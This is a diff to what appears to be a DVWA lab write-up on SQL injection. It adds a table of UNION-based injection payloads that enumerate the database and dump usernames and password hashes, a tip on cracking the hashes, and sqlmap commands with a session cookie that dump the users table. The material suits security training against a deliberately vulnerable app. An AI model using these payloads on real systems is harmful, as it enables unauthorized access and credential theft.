@@ -78,6 +78,41 @@ Database Disclosure | Errors may reveal DB info due to `die(mysqli_error(...))`
 🔁 Payload:
 ?id=1' OR '1'='1--+
 
+manual exploitation
+
+id=1'+or+1=1--+
+| 🧩 Step | 🔍 Payload                                                                                                        | 🧠 Description                          |
+| ------- | ----------------------------------------------------------------------------------------------------------------- | --------------------------------------- |
+| 1       | `?id=1' order by 1,2--+`                                                                                          | Determine number of columns             |
+| 2       | `?id=1' union select 1,2--+`                                                                                      | Confirm injectable points               |
+| 3       | `?id=1' union select database(),version()--+`                                                                     | Leak DB name and version                |
+| 4       | `?id=1' union select 1,table_name from information_schema.tables--+`                                              | Dump table names                        |
+| 5       | `?id=1' union select 1,column_name from information_schema.columns where table_name=char(117,115,101,114,115)--+` | Extract column names from `users` table |
+| 6       | `?id=1'+union+select+user,password+from+users+--+`                                                                | Dump user credentials (usually hashed)  |
+
+🧰 Tip: Use CrackStation to crack MD5/SHA1 hashes found in the password column.
+
+🤖 SQL Injection (Blind) using SQLMap
+When classic SQLi is not possible, use SQLMap for blind extraction.
+
+# 🔍 Step 1: Enumerate databases
+sqlmap -u 'http://192.168.1.7/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit' \\
+--cookie="security=low; PHPSESSID=d5c773c75e22c2df70cb53ab181a373b" --dbs
+
+# 📂 Step 2: Enumerate tables from dvwa
+sqlmap -u 'http://192.168.1.7/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit' \\
+--cookie="security=low; PHPSESSID=d5c773c75e22c2df70cb53ab181a373b" -D dvwa --tables
+
+# 📄 Step 3: Enumerate columns from 'users'
+sqlmap -u 'http://192.168.1.7/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit' \\
+--cookie="security=low; PHPSESSID=d5c773c75e22c2df70cb53ab181a373b" -D dvwa -T users --columns
+
+# 🔐 Step 4: Dump credentials from 'users'
+sqlmap -u 'http://192.168.1.7/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit' \\
+--cookie="security=low; PHPSESSID=d5c773c75e22c2df70cb53ab181a373b" \\
+-D dvwa -T users -C user,password,first_name,last_name --dump
+
+
 🎯 Success Indicator:
 - Displays all user records instead of one
 - Errors may disclose SQL structure
